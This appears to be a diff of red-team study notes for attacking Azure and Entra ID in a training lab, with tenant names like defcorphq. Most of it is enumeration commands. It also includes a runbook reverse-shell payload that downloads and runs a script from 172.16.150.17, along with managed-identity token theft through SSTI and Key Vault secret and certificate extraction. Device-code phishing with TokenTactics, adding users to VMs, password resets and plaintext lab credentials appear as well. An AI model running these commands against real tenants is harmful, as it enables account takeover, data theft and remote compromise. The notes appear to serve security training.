+Get-MgUserMemberOf -UserId test@defcorphq.onmicrosoft.com
+
+# ---- Roles ----
+
+# Get all role templates
+Get-MgDirectoryRoleTemplate
+
+# Get all enabled roles
+Get-MgDirectoryRole
+
+# Get members of a specific role
+$globalAdminRole = Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'"
+Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id
+
+# Get all custom (non-built-in) role definitions
+Get-MgRoleManagementDirectoryRoleDefinition -All |
+    Where-Object { $_.IsBuiltIn -eq $false }
+
+# ---- Devices ----
+
+# Get all devices
+Get-MgDevice -All
+
+# Get only active (non-stale) devices
+Get-MgDevice -All | Where-Object { $_.ApproximateLastSignInDateTime -ne $null }
+
+# Get registered owners of all devices
+Get-MgDevice -All | ForEach-Object {
+    $device = $_
+    $owners = Get-MgDeviceRegisteredOwner -DeviceId $device.Id
+    if ($owners) {
+        $device
+        $owners | Select-Object -ExpandProperty AdditionalProperties |
+            ForEach-Object { $_['userPrincipalName'] }
+        "`n"
     }
-    $Permissions = (Invoke-RestMethod @RequestParams).value
-    $Permissions | fl *
-    $Permissions.actions | fl *
+}
 
-    # Get Runbook Job Output
-        $JobId = "742e4e1d-ece0-43d8-9544-0ccf0683a465"
-        $URI = "https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Refining/providers/Microsoft.Automation/automationAccounts/ManageMultiCloud/jobs/$JobId/output?api-version=2023-11-01"
-        $RequestParams = @{
-            Method = 'GET'
-            Uri = $URI
-            Headers = @{
-                'Authorization' = "Bearer $accesstoken"
-            }
-        }
-        (Invoke-RestMethod @RequestParams)
-    # Export Runbook job code
-        Export-AzAutomationRunbook -Name ManageAWS -AutomationAccountName ManageMultiCloud -ResourceGroupName Refining -Slot Published -OutputFolder C:\AzAD\Tools\
+# Get registered users of all devices
+Get-MgDevice -All | ForEach-Object {
+    $device = $_
+    $users = Get-MgDeviceRegisteredUser -DeviceId $device.Id
+    if ($users) {
+        $device
+        $users | Select-Object -ExpandProperty AdditionalProperties |
+            ForEach-Object { $_['userPrincipalName'] }
+        "`n"
+    }
+}
 
-    # Code execution over VM 
-    Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose 
+# Get devices owned by a specific user
+Get-MgUserOwnedDevice -UserId michaelmbarron@defcorphq.onmicrosoft.com
 
-    # Get public IP of VM (good when u have codeexec permission on VM)
-    # Get interface name
-    Get-AzVM -Name infradminsrv -ResourceGroupName Research |  select -ExpandProperty NetworkProfile
-    # Get the Public IP object name 
-         # bkpadconnect368  came from previous output ...Microsoft.Network/networkInterfaces/bkpadconnect368
-    Get-AzNetworkInterface -Name bkpadconnect368
-    # Get Public IP value 
-    # bkpadconnectIP came from previous output..Microsoft.Network/publicIPAddresses/bkpadconnectIP
-    Get-AzPublicIpAddress -Name bkpadconnectIP
-    # You gonna find the value in IpAddress field. 
+# Get devices registered by a specific user
+Get-MgUserRegisteredDevice -UserId michaelmbarron@defcorphq.onmicrosoft.com
 
-    # WinRM conection : 
-    # You need to add user to the VM, so u can use it to auth with winrm
-    Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose 
-    $password = ConvertTo-SecureString 'Stud17Password@123' -AsPlainText -Force
-    $creds = New-Object System.Management.Automation.PSCredential('student17', $Password)
-    $sess = New-PSSession -ComputerName 10.0.1.5 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
-    Enter-PSSession $sess   
-    # Important if didnt, you have to do .\username  like this to make it clear it's local user . means local not domain , then \ for username: 
-[51.116.180.87]: PS C:\Users> $creds = New-Object System.Management.Automation.PSCredential('.\student17', $Password)
-[51.116.180.87]: PS C:\Users> $infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds
+# Get Intune-managed (compliant) devices
+Get-MgDevice -All | Where-Object { $_.IsCompliant -eq $true }
 
+# ---- Applications ----
 
-    # Keyvault can be enumerrated with only ARM token but revealing secrets needs to request keyvault token           
-    # Keyvault AT request: 
-    curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER 
-    # Then request again ARM AT:
-    curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER            
-    # Connect 
-    Connect-AzAccount -AccessToken $MIARMAT -KeyVaultAccessToken $MIKVAT -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc
-    # Get the keyvault secert:
-    Get-AzKeyVaultSecret -VaultName ResearchKeyVault
-    # Get secret content (assume we found reader secret)
-    Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText           
+# Get all app registrations
+Get-MgApplication -All
 
+# Get all details about a specific application
+Get-MgApplication -ApplicationId a1333e88-1278-41bf-8145-155a069ebed0
 
-    # If we found custom role: e.g. "RoleDefinitionName: Virtual Machine Command Executor"
-    # Usually work with users (not MI)
-    Get-AzRoleAssignment
-    # we can get it's definiation
-    Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
-    # Same thing for custom group 
-    Get-AzADGroup -DisplayName 'VM Admins'
-    # Get group members 
-    Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select DisplayName
-    
-    # List roles and groups user (VMContributorX@defcorphq.onmicrosoft.com) is member of
-    # Need MS graph token 
-    $Token= (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
-    $URI = 'https://graph.microsoft.com/v1.0/users/student17@defcorphq.onmicrosoft.com/memberOf'
-    $RequestParams = @{
-    Method = 'GET'
-    Uri = $URI
+# Filter apps by display name
+Get-MgApplication -All | Where-Object { $_.DisplayName -match "app" }
+
+# List apps that have password credentials
+Get-MgApplication -All | Where-Object { $_.PasswordCredentials.Count -gt 0 }
+
+# List apps that have key (certificate) credentials
+Get-MgApplication -All | Where-Object { $_.KeyCredentials.Count -gt 0 }
+
+# Get owner of an application
+Get-MgApplicationOwner -ApplicationId a1333e88-1278-41bf-8145-155a069ebed0
+
+# Get apps where a user has a role assignment
+Get-MgUserAppRoleAssignment -UserId roygcain@defcorphq.onmicrosoft.com
+
+# Get apps where a group has a role assignment
+Get-MgGroupAppRoleAssignment -GroupId 57ada729-a581-4d6f-9f16-3fe0961ada82
+
+# Detailed app + group members dump
+Get-MgApplication -All | ForEach-Object {
+    $_ | Format-List *
+    Write-Output "-----------------------"
+}
+
+Get-MgUserMemberOf -UserId $currentUser.Id | ForEach-Object {
+    $_ | Format-List *
+    Write-Output "-----------Members------------"
+    Get-MgGroupMember -GroupId $_.Id | Format-List *
+    Write-Output "-----------------------"
+}
+
+# Less detailed group + members dump
+Get-MgGroup -All | ForEach-Object {
+    $_ | Format-List *
+    Write-Output "-----------Members------------"
+    Get-MgGroupMember -GroupId $_.Id
+    Write-Output "-----------------------"
+}
+
+# More detailed group + members dump
+Get-MgGroup -All | ForEach-Object {
+    $_ | Format-List *
+    Write-Output "-----------Members------------"
+    Get-MgGroupMember -GroupId $_.Id | Format-List *
+    Write-Output "-----------------------"
+}
+
+# ---- Service Principals / Enterprise Apps ----
+
+# Get all service principals
+Get-MgServicePrincipal -All
+
+# Get details about a specific service principal
+Get-MgServicePrincipal -ServicePrincipalId cdddd16e-2611-4442-8f45-053e7c37a264
+
+# Filter SPs by display name
+Get-MgServicePrincipal -All | Where-Object { $_.DisplayName -match "app" }
+
+# List SPs with password credentials
+Get-MgServicePrincipal -All | Where-Object { $_.PasswordCredentials.Count -gt 0 }
+
+# List SPs with key/certificate credentials
+Get-MgServicePrincipal -All | Where-Object { $_.KeyCredentials.Count -gt 0 }
+
+# Get owner of a service principal
+Get-MgServicePrincipalOwner -ServicePrincipalId cdddd16e-2611-4442-8f45-053e7c37a264
+
+# Get objects owned by a service principal
+Get-MgServicePrincipalOwnedObject -ServicePrincipalId cdddd16e-2611-4442-8f45-053e7c37a264
+
+# Get objects created by a service principal
+Get-MgServicePrincipalCreatedObject -ServicePrincipalId cdddd16e-2611-4442-8f45-053e7c37a264
+
+# Get group and role memberships of a service principal
+Get-MgServicePrincipalMemberOf -ServicePrincipalId cdddd16e-2611-4442-8f45-053e7c37a264
+
+# ============================================================
+# 2.2 AZ POWERSHELL MODULE
+# ============================================================
+
+Connect-AzAccount
+
+# Get current context
+Get-AzContext
+
+# List all available contexts
+Get-AzContext -ListAvailable
+
+# Enumerate subscriptions
+Get-AzSubscription
+
+# Enumerate all visible resources
+Get-AzResource
+
+# Enumerate all RBAC role assignments
+Get-AzRoleAssignment
+
+# ---- Users ----
+
+Get-AzADUser
+Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
+Get-AzADUser -SearchString "admin"
+Get-AzADUser | Where-Object { $_.DisplayName -match "admin" }
+
+# Get role assignments for a user (outbound roles)
+Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com
+
+# ---- Groups ----
+
+Get-AzADGroup
+Get-AzADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
+Get-AzADGroup -SearchString "admin" | Format-List *
+Get-AzADGroup | Where-Object { $_.DisplayName -match "admin" }
+Get-AzADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
+
+# ---- Apps ----
+
+Get-AzADApplication
+Get-AzADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0
+Get-AzADApplication | Where-Object { $_.DisplayName -match "app" }
+
+# Get web app services (excluding function apps)
+Get-AzWebApp | Where-Object { $_.Kind -notmatch "functionapp" }
+
+# List apps with password credentials
+Get-AzADApplication | ForEach-Object {
+    if (Get-AzADAppCredential -ObjectId $_.Id) { $_ }
+}
+
+# Function apps
+Get-AzFunctionApp
+
+# Storage accounts
+Get-AzStorageAccount | Format-List
+
+# Key vaults
+Get-AzKeyVault
+
+# ---- Service Principals ----
+
+Get-AzADServicePrincipal
+Get-AzADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264
+Get-AzADServicePrincipal | Where-Object { $_.DisplayName -match "app" }
+
+# ============================================================
+# 2.3 AZ CLI
+# ============================================================
+
+az login
+# If user has no subscription permissions:
+az login `
+    -u User8829957150027433301@defcorpspace.onmicrosoft.com `
+    -p '[C@d8e6b6' `
+    --allow-no-subscriptions
+
+az configure
+
+# Find popular commands for VMs
+az find "vm"
+
+# Tenant and subscription info
+az account tenant list
+az account subscription list
+
+# Current signed-in user (whoami)
+az ad signed-in-user show
+
+# ---- Users ----
+
+az ad user list
+az ad user list --query "[].[displayName]" -o table
+az ad user show --id test@defcorphq.onmicrosoft.com
+az ad user list --query "[?contains(displayName,'admin')].displayName"
+
+# Case-insensitive search (PowerShell pipe)
+az ad user list | ConvertFrom-Json | Where-Object { $_.displayName -match "admin" }
+
+# On-prem synced users
+az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
+
+# Azure AD-only users
+az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
+
+# UPN + DisplayName table
+az ad user list --query "[].{UPN:userPrincipalName, Name:displayName}" --output table
+
+# ---- Groups ----
+
+az ad group list
+az ad group list --query "[].[displayName]" -o table
+az ad group show -g "VM Admins"
+az ad group show -g 783a312d-0de2-4490-92e4-539b0e4ee03e
+
+# Case-insensitive search
+az ad group list | ConvertFrom-Json | Where-Object { $_.displayName -match "admin" }
+
+# On-prem groups
+az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
+
+# Azure AD-only groups
+az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
+
+# Group members
+az ad group member list -g "VM Admins" --query "[].[displayName]" -o table
+
+# Check if user is member of group
+az ad group member check `
+    --group "VM Admins" `
+    --member-id b71d21f6-8e09-4a9d-932a-cb73df519787
+
+# Get groups of which a group is a member
+az ad group get-member-groups -g "VM Admins"
+
+# ---- VMs and Web Apps ----
+
+az vm list
+az vm list --query "[].[name]" -o table
+az vm list -o table
+az webapp list
+az functionapp list --query "[].[name]" -o table
+
+# Network interface name for a specific VM
+az vm nic list --vm-name bkpadconnect --resource-group ENGINEERING
+
+# ---- App Registrations ----
+
+az ad app list
+az ad app list --query "[].[displayName]" -o table
+az ad app show --id a1333e88-1278-41bf-8145-155a069ebed0
+az ad app list --query "[?contains(displayName,'app')].displayName"
+
+# Case-insensitive search
+az ad app list | ConvertFrom-Json | Where-Object { $_.displayName -match "slack" }
+
+# Get owner of an application
+az ad app owner list `
+    --id a1333e88-1278-41bf-8145-155a069ebed0 `
+    --query "[].[displayName]" -o table
+
+# Apps with password credentials
+az ad app list --query "[?passwordCredentials !=null].displayName"
+
+# Apps with key/certificate credentials
+az ad app list --query "[?keyCredentials !=null].displayName"
+
+# ---- Service Principals ----
+
+az ad sp list --all
+az ad sp list --all --query "[].[displayName]" -o table
+az ad sp show --id cdddd16e-2611-4442-8f45-053e7c37a264
+az ad sp list --all --query "[?contains(displayName,'app')].displayName"
+
+# Case-insensitive search
+az ad sp list --all | ConvertFrom-Json | Where-Object { $_.displayName -match "app" }
+
+# Get owner of SP
+az ad sp owner list `
+    --id cdddd16e-2611-4442-8f45-053e7c37a264 `
+    --query "[].[displayName]" -o table
+
+# SPs owned by current user
+az ad sp list --show-mine
+
+# SPs with password credentials
+az ad sp list --all --query "[?passwordCredentials != null].displayName"
+
+# SPs with key/certificate credentials
+az ad sp list --all --query "[?keyCredentials != null].displayName"
+
+# ============================================================
+# TOKEN USAGE — REST API
+# ============================================================
+
+# Enumerate users with AT from phishing/consent grant attack
+$URI = 'https://graph.microsoft.com/v1.0/users'
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $Token" }
+}
+(Invoke-RestMethod @RequestParams).value
+
+# Get subscriptions using ARM token (e.g. from Managed Identity token riding)
+$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $Token" }
+}
+(Invoke-RestMethod @RequestParams).value
+
+# List all resources in a subscription
+$URI = 'https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resources?api-version=2020-10-01'
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $Token" }
+}
+(Invoke-RestMethod @RequestParams).value | Format-List
+
+# List permissions on a specific resource (2015 API)
+$Token = (Get-AzAccessToken).Token
+$URI = 'https://management.azure.com/subscriptions/5e4a7f52-ddf6-422b-8aaf-161e342398d6/resourceGroups/AS-hmvxqpuyzl3343455/providers/Microsoft.KeyVault/vaults/asegfdnurqpj3343460/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $Token" }
+}
+(Invoke-RestMethod @RequestParams).value | Format-List
+
+# List permissions on a specific resource (2022 API — more results)
+$KeyVault          = Get-AzKeyVault
+$SubscriptionID    = (Get-AzSubscription).Id
+$ResourceGroupName = $KeyVault.ResourceGroupName
+$KeyVaultName      = $KeyVault.VaultName
+$URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.KeyVault/vaults/$KeyVaultName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $Access_Token" }
+}
+$Permissions = (Invoke-RestMethod @RequestParams).value
+$Permissions | Format-List *
+
+# Get apps accessible to MI via Graph token
+$URI = 'https://graph.microsoft.com/v1.0/applications'
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $graphToken" }
+}
+(Invoke-RestMethod @RequestParams).value
+
+# Retrieve MI tokens via IDENTITY_ENDPOINT (e.g. from SSTI/code exec in App Service)
+# ARM token
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" `
+    -H secret:$IDENTITY_HEADER
+
+# Key Vault token
+curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" `
+    -H secret:$IDENTITY_HEADER
+
+# Python version (e.g. from Flask SSTI)
+import os, json
+
+IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
+IDENTITY_HEADER   = os.environ['IDENTITY_HEADER']
+
+for resource, label in [
+    ("https://management.azure.com/", "Management API"),
+    ("https://graph.microsoft.com/",  "Graph API"),
+]:
+    val = os.popen(
+        f'curl "{IDENTITY_ENDPOINT}?resource={resource}&api-version=2017-09-01"'
+        f' -H secret:{IDENTITY_HEADER}'
+    ).read()
+    data = json.loads(val)
+    print(f"\n[+] {label}")
+    print("Access Token:", data["access_token"])
+    print("ClientID:",     data["client_id"])
+
+# Get AAD Graph token (used by AzureAD PS module)
+az account get-access-token --resource-type aad-graph
+
+# Get ARM token
+az account get-access-token
+
+# Ride existing tokens
+Connect-AzAccount `
+    -AccessToken      $Token `
+    -GraphAccessToken $graphToken `
+    -AccountId        62e44426-5c46-4e3c-8a89-f461d5d586f2
+
+# ============================================================
+# LATERAL MOVEMENT — AUTOMATION RUNBOOK
+# ============================================================
+
+# rev_shell.ps1 content:
+# iex (New-Object Net.Webclient).downloadstring('http://172.16.150.17:82/InvokePowerShellTcp.ps1')
+# Power -Reverse -IPAddress 172.16.150.17 -Port 4448
+
+Import-AzAutomationRunbook `
+    -Name                student17 `
+    -Path                C:\AzAD\Tools\rev_shell_17.ps1 `
+    -AutomationAccountName HybridAutomation `
+    -ResourceGroupName   Engineering `
+    -Type                PowerShell `
+    -LogVerbose          $true `
+    -LogProgress         $true `
+    -Force
+
+Publish-AzAutomationRunbook `
+    -RunbookName           student17 `
+    -AutomationAccountName HybridAutomation `
+    -ResourceGroupName     Engineering `
+    -Verbose
+
+# Start listener before running
+# nc -nvlp 4448
+
+Start-AzAutomationRunbook `
+    -RunbookName           student17 `
+    -RunOn                 Workergroup1 `
+    -AutomationAccountName HybridAutomation `
+    -ResourceGroupName     Engineering `
+    -Verbose `
+    -Wait
+
+# Troubleshoot job output
+Get-AzAutomationJobOutput `
+    -Id                    <job_id> `
+    -ResourceGroupName     Engineering `
+    -AutomationAccountName HybridAutomation `
+    -Stream                "Any"
+
+# Export a runbook
+Export-AzAutomationRunbook `
+    -Name                  ManageAWS `
+    -AutomationAccountName ManageMultiCloud `
+    -ResourceGroupName     Refining `
+    -Slot                  Published `
+    -OutputFolder          C:\AzAD\Tools\
+
+# Read runbook job output via REST
+$JobId = "742e4e1d-ece0-43d8-9544-0ccf0683a465"
+$URI = "https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Refining/providers/Microsoft.Automation/automationAccounts/ManageMultiCloud/jobs/$JobId/output?api-version=2023-11-01"
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $accesstoken" }
+}
+Invoke-RestMethod @RequestParams
+
+# Get permissions on automation account
+$URI = "https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Refining/providers/Microsoft.Automation/automationAccounts/ManageMultiCloud/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $accesstoken" }
+}
+$Permissions = (Invoke-RestMethod @RequestParams).value
+$Permissions | Format-List *
+$Permissions.actions | Format-List *
+
+# ============================================================
+# CODE EXECUTION ON VM
+# ============================================================
+
+# Run script on VM
+Invoke-AzVMRunCommand `
+    -VMName            bkpadconnect `
+    -ResourceGroupName Engineering `
+    -CommandId         'RunPowerShellScript' `
+    -ScriptPath        'C:\AzAD\Tools\adduser.ps1' `
+    -Verbose
+
+# Get VM public IP
+# 1. Get interface name
+Get-AzVM -Name infradminsrv -ResourceGroupName Research |
+    Select-Object -ExpandProperty NetworkProfile
+
+# 2. Get the public IP object name (interface name from previous output)
+Get-AzNetworkInterface -Name bkpadconnect368
+
+# 3. Get the actual public IP (IP object name from previous output)
+Get-AzPublicIpAddress -Name bkpadconnectIP
+# Value is in the IpAddress field
+
+# ---- WinRM / PSSession ----
+
+# Add local user via RunCommand first (adduser.ps1)
+Invoke-AzVMRunCommand `
+    -VMName            bkpadconnect `
+    -ResourceGroupName Engineering `
+    -CommandId         'RunPowerShellScript' `
+    -ScriptPath        'C:\AzAD\Tools\adduser.ps1' `
+    -Verbose
+
+$password = ConvertTo-SecureString 'Stud17Password@123' -AsPlainText -Force
+$creds    = New-Object System.Management.Automation.PSCredential('student17', $password)
+$sess     = New-PSSession `
+    -ComputerName     10.0.1.5 `
+    -Credential       $creds `
+    -SessionOption    (New-PSSessionOption -ProxyAccessType NoProxyServer)
+Enter-PSSession $sess
+
+# NOTE: If auth fails, prefix username with .\ to specify local account:
+$creds        = New-Object System.Management.Automation.PSCredential('.\student17', $password)
+$infradminsrv = New-PSSession -ComputerName 10.0.1.5 -Credential $creds
+
+# ============================================================
+# KEY VAULT
+# ============================================================
+
+# Key Vault can be enumerated with ARM token only,
+# but reading secrets requires a Key Vault-scoped token.
+
+# Request Key Vault token from MI endpoint
+curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" `
+    -H secret:$IDENTITY_HEADER
+
+# Request ARM token from MI endpoint
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" `
+    -H secret:$IDENTITY_HEADER
+
+# Connect with both tokens
+Connect-AzAccount `
+    -AccessToken         $MIARMAT `
+    -KeyVaultAccessToken $MIKVAT `
+    -AccountId           2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc
+
+# List secrets in a vault
+Get-AzKeyVaultSecret -VaultName ResearchKeyVault
+
+# Read a secret value
+Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
+
+# ============================================================
+# CUSTOM ROLES AND GROUPS
+# ============================================================
+
+# List all role assignments
+Get-AzRoleAssignment
+
+# Get definition of a custom role
+Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
+
+# Get a specific group
+Get-AzADGroup -DisplayName 'VM Admins'
+
+# Get group members
+Get-AzADGroupMember -GroupDisplayName 'VM Admins' | Select-Object DisplayName
+
+# List roles and groups a user is member of (requires MS Graph token)
+$Token = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
+$URI   = 'https://graph.microsoft.com/v1.0/users/student17@defcorphq.onmicrosoft.com/memberOf'
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $Token" }
+}
+(Invoke-RestMethod @RequestParams).value
+
+# ---- Administrative Units ----
+
+# Get an administrative unit by ID
+Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395
+
+# Get members of an administrative unit
+Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395
+
+# Get scoped role memberships (who has a role over AU members)
+Get-MgDirectoryAdministrativeUnitScopedRoleMember `
+    -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395 | Format-List
+
+# Reset a user's password
+$passwordProfile = @{
+    forceChangePasswordNextSignIn = $false
+    password                      = 'NewUserSSecret@Pass61'
+}
+Update-MgUser `
+    -UserId          AS-5945632460@oilcorptarsands.onmicrosoft.com `
+    -PasswordProfile $passwordProfile
+
+# ---- Application Proxy ----
+
+# Enumerate all apps with Application Proxy configured (still requires AzureAD or Graph Beta)
+# Install-Module Microsoft.Graph.Beta -Scope CurrentUser
+Get-MgBetaApplication | ForEach-Object {
+    try {
+        Get-MgBetaApplicationOnPremisesPublishing -ApplicationId $_.Id
+        $_.DisplayName
+        $_.Id
+    } catch {}
+}
+
+# Check users/groups with access to an App Proxy app
+$sp = Get-MgServicePrincipal -Filter "DisplayName eq 'Finance Management System'"
+Get-MgServicePrincipalAppRoleAssignedTo -ServicePrincipalId $sp.Id | Format-List
+
+# ============================================================
+# DEVICE CODE PHISHING (TokenTactics)
+# ============================================================
+
+Import-Module C:\AzAD\Tools\TokenTactics-main\TokenTactics.psd1
+Get-AzureToken -Client MSGraph
+
+# After the victim authenticates, grab the access token:
+$response.access_token
+
+# If the access token expires, refresh using:
+Invoke-RefreshGraphTokens `
+    -refreshToken $response.refresh_token `
+    -tenantid     d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
+
+# FOCI — get MS Graph AT from refresh token
+$GraphAT = (Invoke-RefreshToMSGraphToken `
+    -domain       oilcorporation.onmicrosoft.com `
+    -refreshToken $tokens.refresh_token).access_token
+
+# ============================================================
+# APPLICATIONS — SECRETS / CERTS ENUM + SAVE
+# ============================================================
+
+$GraphAccessToken = $AccessToken
+$URI = "https://graph.microsoft.com/v1.0/Applications"
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $GraphAccessToken" }
+}
+$Applications = (Invoke-RestMethod @RequestParams).value
+
+$ApplicationsDetails = [PSCustomObject]@{ Applications = @() }
+foreach ($Application in $Applications) {
+    $ApplicationsDetails.Applications += [PSCustomObject]@{
+        DisplayName         = $Application.displayName
+        AppId               = $Application.appId
+        CreatedDateTime     = $Application.createdDateTime
+        ID                  = $Application.id
+        keyCredentials      = $Application.keyCredentials
+        passwordCredentials = $Application.passwordCredentials
+    }
+}
+$ApplicationsDetails.Applications
+$ApplicationsDetails.Applications | Export-Clixml -Path C:\AzAD\Tools\OilCorpApplications.xml
+
+# ---- Match cert from Key Vault to app ----
+
+$secret      = Get-AzKeyVaultSecret -VaultName GISAppvault -Name GISAppCert -AsPlainText
+$secretByte  = [Convert]::FromBase64String($secret)
+[System.IO.File]::WriteAllBytes("C:\AzAD\Tools\StorageCert.pfx", $secretByte)
+
+$clientCertificate = New-Object `
+    System.Security.Cryptography.X509Certificates.X509Certificate2 `
+    -ArgumentList 'C:\AzAD\Tools\StorageCert.pfx'
+
+Import-Clixml C:\AzAD\Tools\OilCorpApplications.xml |
+    Where-Object { $_.keyCredentials.customKeyIdentifier -eq $clientCertificate.Thumbprint }
+
+# ============================================================
+# KEY VAULT — REFRESH TOKEN EXCHANGE
+# ============================================================
+
+$scope         = 'https://vault.azure.net/.default'
+$refresh_token = $tokens.refresh_token
+$body = @{
+    client_id     = $ClientID
+    scope         = $scope
+    refresh_token = $refresh_token
+    grant_type    = 'refresh_token'
+}
+$KeyVaultAccessToken = Invoke-RestMethod `
+    -UseBasicParsing `
+    -Method Post `
+    -Uri    "https://login.microsoftonline.com/common/oauth2/v2.0/token" `
+    -Body   $body
+$KeyVaultAccessToken
+
+# Connect with ARM + Key Vault tokens
+Connect-AzAccount `
+    -AccessToken         $accesstoken `
+    -KeyVaultAccessToken $KeyVaultAccessToken.access_token `
+    -AccountId           ThomasLWright@oilcorporation.onmicrosoft.com
+
+# Get Key Vault certificate and write to disk
+Get-AzKeyVaultCertificate -VaultName GISAppvault
+$secret     = Get-AzKeyVaultSecret -VaultName GISAppvault -Name GISAppCert -AsPlainText
+$secretByte = [Convert]::FromBase64String($secret)
+[System.IO.File]::WriteAllBytes("C:\AzAD\Tools\GISAppcert.pfx", $secretByte)
+
+# ============================================================
+# AUTHENTICATE WITH CERT + GET TOKENS
+# ============================================================
+
+. .\New-AccessToken.ps1
+
+$secret     = Get-Content .\CertificateBase64.txt
+$secretByte = [Convert]::FromBase64String($secret)
+[System.IO.File]::WriteAllBytes("C:\AzAD\Tools\StorageCert.pfx", $secretByte)
+
+$clientCertificate = New-Object `
+    System.Security.Cryptography.X509Certificates.X509Certificate2 `
+    -ArgumentList 'C:\AzAD\Tools\StorageCert.pfx'
+
+$StorageToken = New-AccessToken `
+    -clientCertificate $clientCertificate `
+    -tenantID          2e0d024c-5e44-47f7-b4b8-42126b542e36 `
+    -appID             578e381a-8f03-4cae-8b3e-559d02023ee1 `
+    -scope             'https://management.azure.com/.default'
+
+$GraphToken = New-AccessToken `
+    -clientCertificate $clientCertificate `
+    -tenantID          2e0d024c-5e44-47f7-b4b8-42126b542e36 `
+    -appID             578e381a-8f03-4cae-8b3e-559d02023ee1 `
+    -scope             'https://graph.microsoft.com/.default'
+
+$AadToken = New-AccessToken `
+    -clientCertificate $clientCertificate `
+    -tenantID          2e0d024c-5e44-47f7-b4b8-42126b542e36 `
+    -appID             578e381a-8f03-4cae-8b3e-559d02023ee1 `
+    -scope             'https://graph.windows.net/.default'
+
+Connect-AzAccount `
+    -AccessToken $StorageToken `
+    -AccountId   578e381a-8f03-4cae-8b3e-559d02023ee1
+
+[X509Certificate]$clientCertificate2 = Get-PfxCertificate -FilePath C:\AzAD\Tools\StorageCert.pfx
+
+Connect-MgGraph `
+    -Certificate $clientCertificate2 `
+    -ClientId    578e381a-8f03-4cae-8b3e-559d02023ee1 `
+    -TenantId    2e0d024c-5e44-47f7-b4b8-42126b542e36
+
+# ============================================================
+# KEY VAULT — CERT METADATA + JWT SIGNING
+# ============================================================
+
+# Get Key Vault cert metadata (API v7.4)
+$URI = "https://asegfdnurqpj3343460.vault.azure.net/certificates?api-version=7.4"
+$RequestParams = @{
+    Method      = 'GET'
+    Uri         = $URI
+    Headers     = @{ 'Authorization' = "Bearer $KVAT" }
+    ContentType = "application/json"
+}
+$KVInfo = (Invoke-RestMethod @RequestParams).value
+$KVInfo | Format-List *
+
+# Get vault cert metadata (detailed, API v7.3)
+function Get-AKVCertificate {
